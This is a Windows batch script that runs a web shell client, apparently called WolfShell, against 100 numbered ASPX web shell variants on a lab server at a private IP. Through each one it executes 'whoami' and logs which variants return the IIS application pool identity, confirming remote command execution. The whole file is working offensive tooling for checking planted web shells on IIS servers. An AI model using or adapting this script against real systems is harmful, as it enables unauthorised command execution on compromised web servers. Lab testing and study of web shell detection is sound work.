@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Define the base URL and the executable path
SET "BASE_URL=http://192.168.18.14/aspx/1_variant_"
SET "WOLF_EXE=E:\Download\wolfshell-main\wshell.exe"
SET "SUCCESS_STRING=iis apppool\defaultapppool"

REM Clear or create the log files
if exist isok.txt del isok.txt
if exist err.txt del err.txt

REM Loop from 1 to 100
FOR /L %%i IN (1,1,100) DO (
    SET "URL=!BASE_URL!%%i.aspx"
    echo Checking: !URL!
    
    REM Execute the command and capture the output
    "!WOLF_EXE!" "!URL!" WolfShell whoami > temp_output.txt 2>&1
    
    REM Check if the output contains the success string
    find "!SUCCESS_STRING!" temp_output.txt > nul
    
    IF !ERRORLEVEL! EQU 0 (
        (echo URL: !URL! & type temp_output.txt & echo. & echo ---------------------------------------- & echo.) >> isok.txt
    ) ELSE (
        (echo URL: !URL! & type temp_output.txt & echo. & echo ---------------------------------------- & echo.) >> err.txt
    )
)

REM Clean up the temporary file
del temp_output.txt

ECHO Script finished. Check isok.txt and err.txt for results with raw output.
ENDLOCAL
